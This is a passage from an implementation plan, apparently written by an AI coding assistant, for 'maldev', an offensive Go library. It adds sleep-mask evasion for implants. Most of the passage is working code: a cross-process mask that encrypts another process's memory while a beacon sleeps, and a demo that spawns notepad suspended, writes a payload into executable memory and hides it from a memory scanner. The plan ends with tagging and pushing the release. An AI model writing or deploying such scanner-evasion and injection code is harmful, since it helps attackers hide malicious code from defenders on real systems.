	Cycle(ctx context.Context, regions []RemoteRegion, cipher Cipher, key []byte, d time.Duration) error
}

// RemoteMask is the cross-process Mask.
type RemoteMask struct {
	regions  []RemoteRegion
	cipher   Cipher
	strategy RemoteStrategy
}

// NewRemote builds a RemoteMask over the given remote regions.
func NewRemote(regions ...RemoteRegion) *RemoteMask {
	return &RemoteMask{
		regions:  regions,
		cipher:   NewXORCipher(),
		strategy: &RemoteInlineStrategy{},
	}
}

func (m *RemoteMask) WithCipher(c Cipher) *RemoteMask {
	if c == nil {
		c = NewXORCipher()
	}
	m.cipher = c
	return m
}

func (m *RemoteMask) WithStrategy(s RemoteStrategy) *RemoteMask {
	if s == nil {
		s = &RemoteInlineStrategy{}
	}
	m.strategy = s
	return m
}

// Sleep runs one encrypt → wait → decrypt cycle on the remote regions.
// Semantics mirror Mask.Sleep.
func (m *RemoteMask) Sleep(ctx context.Context, d time.Duration) error {
	if len(m.regions) == 0 || d <= 0 {
		return nil
	}
	key := make([]byte, m.cipher.KeySize())
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("sleepmask/remote: key generation: %w", err)
	}
	defer memory.SecureZero(key)
	return m.strategy.Cycle(ctx, m.regions, m.cipher, key, d)
}
```

### Task 4.2 — `RemoteInlineStrategy` Windows + stub

**Files:**
- Create: `evasion/sleepmask/remote_strategy_windows.go`
- Create: `evasion/sleepmask/remote_strategy_stub.go`

- [ ] **Step 1: Windows impl**

```go
//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"time"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/timing"
)

// RemoteInlineStrategy is the L1 cross-process strategy: the caller
// goroutine drives the full encrypt → wait → decrypt cycle using
// VirtualProtectEx + ReadProcessMemory + WriteProcessMemory. The
// cipher runs on a local buffer (ReadProcessMemory → Apply →
// WriteProcessMemory).
type RemoteInlineStrategy struct {
	UseBusyTrig bool
}

func (s *RemoteInlineStrategy) Cycle(ctx context.Context, regions []RemoteRegion, cipher Cipher, key []byte, d time.Duration) error {
	origProtect := make([]uint32, len(regions))

	// Encrypt.
	for i, r := range regions {
		h := windows.Handle(r.Handle)
		if err := windows.VirtualProtectEx(h, r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt VirtualProtectEx: %w", err)
		}
		buf := make([]byte, r.Size)
		var n uintptr
		if err := windows.ReadProcessMemory(h, r.Addr, &buf[0], r.Size, &n); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt ReadProcessMemory: %w", err)
		}
		cipher.Apply(buf, key)
		if err := windows.WriteProcessMemory(h, r.Addr, &buf[0], r.Size, &n); err != nil {
			return fmt.Errorf("sleepmask/remote-inline: encrypt WriteProcessMemory: %w", err)
		}
	}

	// Wait.
	waitErr := s.wait(ctx, d)

	// Decrypt (always).
	for i, r := range regions {
		h := windows.Handle(r.Handle)
		var tmp uint32
		windows.VirtualProtectEx(h, r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		buf := make([]byte, r.Size)
		var n uintptr
		windows.ReadProcessMemory(h, r.Addr, &buf[0], r.Size, &n)
		cipher.Apply(buf, key)
		windows.WriteProcessMemory(h, r.Addr, &buf[0], r.Size, &n)
		windows.VirtualProtectEx(h, r.Addr, r.Size, origProtect[i], &tmp)
	}

	return waitErr
}

func (s *RemoteInlineStrategy) wait(ctx context.Context, d time.Duration) error {
	if s.UseBusyTrig {
		done := make(chan struct{})
		go func() { timing.BusyWaitTrig(d); close(done) }()
		select {
		case <-done:
			return nil
		case <-ctx.Done():
			return ctx.Err()
		}
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
```

- [ ] **Step 2: Stub**

```go
//go:build !windows

package sleepmask

import (
	"context"
	"errors"
	"time"
)

type RemoteInlineStrategy struct {
	UseBusyTrig bool
}

func (*RemoteInlineStrategy) Cycle(ctx context.Context, regions []RemoteRegion, cipher Cipher, key []byte, d time.Duration) error {
	return errors.New("sleepmask: RemoteInlineStrategy requires Windows")
}
```

- [ ] **Step 3: Build**

```bash
go build ./evasion/sleepmask/
GOOS=windows GOARCH=amd64 go build ./evasion/sleepmask/
```

Expected: green.

### Task 4.3 — RemoteMask unit test (cross-platform)

**Files:**
- Create: `evasion/sleepmask/remote_mask_test.go`

- [ ] **Step 1: Write test**

```go
package sleepmask

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewRemote(t *testing.T) {
	m := NewRemote(RemoteRegion{Handle: 0xBEEF, Addr: 0x1000, Size: 4096})
	require.NotNil(t, m)
	_, ok := m.cipher.(*XORCipher)
	assert.True(t, ok)
	_, ok = m.strategy.(*RemoteInlineStrategy)
	assert.True(t, ok)
}

func TestRemoteMask_WithCipher_Nil(t *testing.T) {
	m := NewRemote().WithCipher(nil)
	_, ok := m.cipher.(*XORCipher)
	assert.True(t, ok)
}

func TestRemoteMask_WithStrategy_Nil(t *testing.T) {
	m := NewRemote().WithStrategy(nil)
	_, ok := m.strategy.(*RemoteInlineStrategy)
	assert.True(t, ok)
}
```

### Task 4.4 — RemoteInlineStrategy VM test with notepad

**Files:**
- Create: `evasion/sleepmask/remote_mask_windows_test.go`

- [ ] **Step 1: Write test**

```go
//go:build windows

package sleepmask

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/testutil"
)

func TestRemoteInlineStrategy_RoundTrip(t *testing.T) {
	testutil.RequireIntrusive(t)

	pid, cleanup := testutil.SpawnAndResume(t)
	defer cleanup()

	h, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		false, pid)
	require.NoError(t, err)
	defer windows.CloseHandle(h)

	// Alloc + write canary in the remote process.
	data := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x41, 0x42, 0x43, 0x44}
	remoteAddr, _, _ := windows.NewLazySystemDLL("kernel32.dll").
		NewProc("VirtualAllocEx").Call(
		uintptr(h), 0, uintptr(len(data)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	require.NotZero(t, remoteAddr)
	var n uintptr
	require.NoError(t, windows.WriteProcessMemory(h, remoteAddr, &data[0], uintptr(len(data)), &n))

	// Mask the remote region.
	mask := NewRemote(RemoteRegion{Handle: uintptr(h), Addr: remoteAddr, Size: uintptr(len(data))})
	require.NoError(t, mask.Sleep(context.Background(), 50*time.Millisecond))

	// Read back and verify round-trip.
	got := make([]byte, len(data))
	require.NoError(t, windows.ReadProcessMemory(h, remoteAddr, &got[0], uintptr(len(got)), &n))
	assert.Equal(t, data, got)
}
```

- [ ] **Step 2: Run on VM with intrusive gate**

```bash
MALDEV_INTRUSIVE=1 ./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 60s -run TestRemoteInlineStrategy"
```

Expected: PASS.

### Task 4.5 — Commit

- [ ] **Step 1: Commit**

```bash
git add evasion/sleepmask/remote_mask.go \
        evasion/sleepmask/remote_strategy_windows.go \
        evasion/sleepmask/remote_strategy_stub.go \
        evasion/sleepmask/remote_mask_test.go \
        evasion/sleepmask/remote_mask_windows_test.go
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" commit -m "$(cat <<'MSG'
feat(sleepmask): RemoteMask + RemoteInlineStrategy (v0.12.0 part 4/5)

Cross-process variant of Mask. RemoteRegion carries a process handle
with VM_OPERATION|VM_WRITE|VM_READ access; RemoteInlineStrategy
replaces VirtualProtect with VirtualProtectEx and does the cipher on
a local buffer (ReadProcessMemory → Apply → WriteProcessMemory).

Only L1 ships cross-process in v0.12.0. Remote L2 (pool thread in our
process masking a remote region) is deferred — see design spec.

Co-Authored-By: Claude Sonnet 4.6 (1M context) <noreply@anthropic.com>
MSG
)"
```

---

## COMMIT 5 — cmd/sleepmask-demo + doc rewrite + v0.12.0

### Task 5.1 — Demo main.go + scenario dispatcher

**Files:**
- Create: `cmd/sleepmask-demo/main.go`

- [ ] **Step 1: Write flag parsing + dispatcher**

```go
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"time"
)

func main() {
	scenario := flag.String("scenario", "self", "self | host")
	hostBinary := flag.String("host-binary", `C:\Windows\System32\notepad.exe`, "path for host scenario")
	cipher := flag.String("cipher", "xor", "xor | rc4 | aes")
	strategy := flag.String("strategy", "inline", "inline | timerqueue | ekko")
	useBusyTrig := flag.Bool("inline-busytrig", false, "inline only: use BusyWaitTrig")
	cycles := flag.Int("cycles", 3, "number of beacon cycles")
	sleepDur := flag.Duration("sleep", 5*time.Second, "per-cycle sleep")
	scanner := flag.Bool("scanner", true, "concurrent scanner")
	scanInt := flag.Duration("scanner-interval", 100*time.Millisecond, "scanner poll interval")
	verbose := flag.Bool("verbose", true, "per-step logging")
	flag.Parse()

	if runtime.GOOS != "windows" {
		fmt.Fprintln(os.Stderr, "sleepmask-demo: Windows only")
		os.Exit(1)
	}

	cfg := demoConfig{
		HostBinary:      *hostBinary,
		CipherName:      *cipher,
		StrategyName:    *strategy,
		UseBusyTrig:     *useBusyTrig,
		Cycles:          *cycles,
		Sleep:           *sleepDur,
		EnableScanner:   *scanner,
		ScannerInterval: *scanInt,
		Verbose:         *verbose,
	}

	switch *scenario {
	case "self":
		if err := runSelf(cfg); err != nil {
			log.Fatalf("self scenario: %v", err)
		}
	case "host":
		if err := runHost(cfg); err != nil {
			log.Fatalf("host scenario: %v", err)
		}
	default:
		fmt.Fprintf(os.Stderr, "unknown scenario %q (use: self, host)\n", *scenario)
		os.Exit(1)
	}
}

type demoConfig struct {
	HostBinary      string
	CipherName      string
	StrategyName    string
	UseBusyTrig     bool
	Cycles          int
	Sleep           time.Duration
	EnableScanner   bool
	ScannerInterval time.Duration
	Verbose         bool
}
```

### Task 5.2 — Scenario A (canary-in-self)

**Files:**
- Create: `cmd/sleepmask-demo/canary_windows.go`
- Create: `cmd/sleepmask-demo/canary_stub.go`

- [ ] **Step 1: Windows impl**

```go
//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/sleepmask"
	"github.com/oioio-space/maldev/testutil"
)

func runSelf(cfg demoConfig) error {
	// Allocate + write canary.
	payload := testutil.WindowsSearchableCanary
	size := uintptr(len(payload))
	addr, err := windows.VirtualAlloc(0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAlloc: %w", err)
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(payload)), payload)
	var old uint32
	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &old); err != nil {
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	logf(cfg, "allocated canary at 0x%X (RX, %d bytes)", addr, size)

	mask, err := buildMask(cfg, sleepmask.Region{Addr: addr, Size: size})
	if err != nil {
		return err
	}

	stopScan := make(chan struct{})
	if cfg.EnableScanner {
		go runScanner(cfg, []byte("MALDEV_CANARY!!\n"), stopScan)
	}
	defer close(stopScan)

	for cycle := 1; cycle <= cfg.Cycles; cycle++ {
		logf(cfg, "cycle %d/%d begin", cycle, cfg.Cycles)
		ctx, cancel := context.WithTimeout(context.Background(), cfg.Sleep+5*time.Second)
		if err := mask.Sleep(ctx, cfg.Sleep); err != nil {
			cancel()
			return fmt.Errorf("cycle %d: %w", cycle, err)
		}
		cancel()
		logf(cfg, "cycle %d/%d end", cycle, cfg.Cycles)
	}
	return nil
}

func buildMask(cfg demoConfig, region sleepmask.Region) (*sleepmask.Mask, error) {
	var cipher sleepmask.Cipher
	switch cfg.CipherName {
	case "xor":
		cipher = sleepmask.NewXORCipher()
	case "rc4":
		cipher = sleepmask.NewRC4Cipher()
	case "aes":
		cipher = sleepmask.NewAESCTRCipher()
	default:
		return nil, fmt.Errorf("unknown cipher %q", cfg.CipherName)
	}

	var strat sleepmask.Strategy
	switch cfg.StrategyName {
	case "inline":
		strat = &sleepmask.InlineStrategy{UseBusyTrig: cfg.UseBusyTrig}
	case "timerqueue":
		strat = &sleepmask.TimerQueueStrategy{}
	case "ekko":
		strat = &sleepmask.EkkoStrategy{}
		// EkkoStrategy requires RC4; force the cipher if user didn't.
		if cfg.CipherName != "rc4" {
			fmt.Fprintln(os.Stderr, "note: EkkoStrategy requires rc4 cipher; overriding")
			cipher = sleepmask.NewRC4Cipher()
		}
	default:
		return nil, fmt.Errorf("unknown strategy %q", cfg.StrategyName)
	}

	return sleepmask.New(region).WithCipher(cipher).WithStrategy(strat), nil
}

func runScanner(cfg demoConfig, marker []byte, stop <-chan struct{}) {
	t := time.NewTicker(cfg.ScannerInterval)
	defer t.Stop()
	start := time.Now()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			if addr, ok := testutil.ScanProcessMemory(marker); ok {
				fmt.Printf("[%04dms] scanner HIT at 0x%X\n", elapsedMs(start), addr)
			} else {
				fmt.Printf("[%04dms] scanner MISS\n", elapsedMs(start))
			}
		}
	}
}

func logf(cfg demoConfig, format string, args ...interface{}) {
	if !cfg.Verbose {
		return
	}
	fmt.Printf("[%04dms] "+format+"\n", append([]interface{}{elapsedMs(globalStart)}, args...)...)
}

var globalStart = time.Now()

func elapsedMs(since time.Time) int {
	return int(time.Since(since) / time.Millisecond)
}
```

- [ ] **Step 2: Stub**

```go
//go:build !windows

package main

import "errors"

func runSelf(cfg demoConfig) error {
	return errors.New("self scenario: Windows only")
}
```

### Task 5.3 — Scenario B (host=notepad)

**Files:**
- Create: `cmd/sleepmask-demo/host_windows.go`
- Create: `cmd/sleepmask-demo/host_stub.go`

- [ ] **Step 1: Windows impl**

```go
//go:build windows

package main

import (
	"context"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/sleepmask"
	"github.com/oioio-space/maldev/testutil"
)

func runHost(cfg demoConfig) error {
	// Spawn host (notepad) suspended using standard CreateProcess.
	cmdLine, err := windows.UTF16PtrFromString(cfg.HostBinary)
	if err != nil {
		return fmt.Errorf("utf16: %w", err)
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	if err := windows.CreateProcess(nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("CreateProcess: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.TerminateProcess(pi.Process, 0)
	defer windows.CloseHandle(pi.Process)

	logf(cfg, "spawned %s pid=%d", cfg.HostBinary, pi.ProcessId)

	// Alloc + write canary in host.
	payload := testutil.WindowsSearchableCanary
	remoteAddr, _, _ := windows.NewLazySystemDLL("kernel32.dll").
		NewProc("VirtualAllocEx").Call(
		uintptr(pi.Process), 0, uintptr(len(payload)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx remote")
	}
	var n uintptr
	if err := windows.WriteProcessMemory(pi.Process, remoteAddr, &payload[0], uintptr(len(payload)), &n); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	logf(cfg, "wrote canary at remote 0x%X (pid %d)", remoteAddr, pi.ProcessId)

	// Build cipher (no strategy choice — remote only ships inline this session).
	var cipher sleepmask.Cipher
	switch cfg.CipherName {
	case "xor":
		cipher = sleepmask.NewXORCipher()
	case "rc4":
		cipher = sleepmask.NewRC4Cipher()
	case "aes":
		cipher = sleepmask.NewAESCTRCipher()
	default:
		return fmt.Errorf("unknown cipher %q", cfg.CipherName)
	}

	mask := sleepmask.NewRemote(sleepmask.RemoteRegion{
		Handle: uintptr(pi.Process), Addr: remoteAddr, Size: uintptr(len(payload)),
	}).WithCipher(cipher)

	for cycle := 1; cycle <= cfg.Cycles; cycle++ {
		logf(cfg, "cycle %d/%d begin (remote)", cycle, cfg.Cycles)
		ctx, cancel := context.WithTimeout(context.Background(), cfg.Sleep+5*time.Second)
		if err := mask.Sleep(ctx, cfg.Sleep); err != nil {
			cancel()
			return fmt.Errorf("cycle %d: %w", cycle, err)
		}
		cancel()
		logf(cfg, "cycle %d/%d end", cycle, cfg.Cycles)
	}
	return nil
}
```

- [ ] **Step 2: Stub**

```go
//go:build !windows

package main

import "errors"

func runHost(cfg demoConfig) error {
	return errors.New("host scenario: Windows only")
}
```

- [ ] **Step 3: Build**

```bash
go build ./cmd/sleepmask-demo
GOOS=windows GOARCH=amd64 go build ./cmd/sleepmask-demo
```

Expected: both green.

### Task 5.4 — Rewrite `docs/techniques/evasion/sleep-mask.md`

**Files:**
- Modify: `docs/techniques/evasion/sleep-mask.md`

Follow the outline in the design spec's "Documentation plan" section. Major sections:

- [ ] **Step 1: Replace the whole file** — see spec §Documentation plan for the outline. Expected size: 500-700 lines.

Key content:
- 4-level taxonomy table with columns: Level, Name, Implementation, Ship in v0.12.0
- Per-strategy subsection with a Mermaid diagram
- Cipher comparison table (XOR / RC4 / AES)
- Cross-process flow
- `cmd/sleepmask-demo` usage walkthrough with sample output
- Limitations for Go implants (shellcode focus, no runtime mask, no stack mask)
- Link to design spec

### Task 5.5 — Update CHANGELOG

**Files:**
- Modify: `CHANGELOG.md`

- [ ] **Step 1: Add a `[v0.12.0] — 2026-04-23` section under `[Unreleased]`**

Follow the pattern in the existing `[v0.11.0]` entry. List:
- Breaking: Sleep signature, SleepMethod removal
- Added: Cipher interface + XOR/RC4/AES, Strategy + 3 strategies, RemoteMask + RemoteInlineStrategy, cmd/sleepmask-demo, sleep-mask.md rewrite
- Fixed: (carry over any fixes that landed during this session)
- Deferred: L3, L4, Remote L2/L3, stack masking

### Task 5.6 — Full test sweep + tag v0.12.0

- [ ] **Step 1: Host + Windows VM full sweep**

```bash
go build ./...
go test ./... -count=1 2>&1 | grep FAIL
./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 180s"
MALDEV_INTRUSIVE=1 ./scripts/vm-run-tests.sh windows "./evasion/sleepmask/..." "-v -count=1 -timeout 180s"
```

Expected: no FAIL lines in any run.

- [ ] **Step 2: Commit**

```bash
git add cmd/sleepmask-demo/ \
        docs/techniques/evasion/sleep-mask.md \
        CHANGELOG.md
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" commit -m "$(cat <<'MSG'
feat(sleepmask): cmd/sleepmask-demo + sleep-mask.md rewrite (v0.12.0 part 5/5)

Runnable demonstration of the three strategies and both
(self/host) scenarios with a concurrent memory scanner that prints
HIT/MISS transitions as the mask cycles.

sleep-mask.md fully rewritten to cover the 4-level taxonomy, the
Cipher tradeoffs, per-strategy threading diagrams, the cross-process
variant, and the Go-implant-specific limitations. CHANGELOG sealed
to [v0.12.0].

Co-Authored-By: Claude Sonnet 4.6 (1M context) <noreply@anthropic.com>
MSG
)"
```

- [ ] **Step 3: Tag + push**

```bash
git -c user.name="oioio-space" -c user.email="oioio-space@users.noreply.github.com" tag -a v0.12.0 -m "v0.12.0 — 3-strategy sleep-mask, real Ekko port, RemoteMask, demo"
git push origin master
git push origin v0.12.0
```

Expected: master + tag pushed to GitHub.

---

## Self-review

- [x] **Spec coverage**: Every section in the spec maps to at least one task. Specifically:
  - Cipher interface — Task 1.1
  - Strategy interface — 1.2
  - InlineStrategy — 1.5 + 1.6
  - TimerQueueStrategy — 2.1–2.4 + 2.5
  - EkkoStrategy — 3.1–3.7 + 3.8 (e2e)
  - RemoteMask + RemoteInlineStrategy — 4.1–4.4
  - cmd/sleepmask-demo — 5.1–5.3
  - Doc rewrite — 5.4
  - CHANGELOG — 5.5
  - Tag v0.12.0 — 5.6

- [x] **Placeholder scan**: No TBD/TODO/fill-in. Every code step has actual code.

- [x] **Type consistency**: `Strategy.Cycle` signature identical across definition (Task 1.2) and three implementations (1.5, 2.3, 3.5). `RemoteStrategy.Cycle` same. `Mask`'s `WithCipher`/`WithStrategy` accept nil uniformly.

- [x] **Scope**: Focused — single feature (sleepmask variants), five atomic commits, each independently testable and committable.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-04-23-sleepmask-variants.md`. Two execution options:

**1. Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration.

**2. Inline Execution** — Execute tasks in this session using `superpowers:executing-plans`, batch execution with checkpoints.

Which approach?
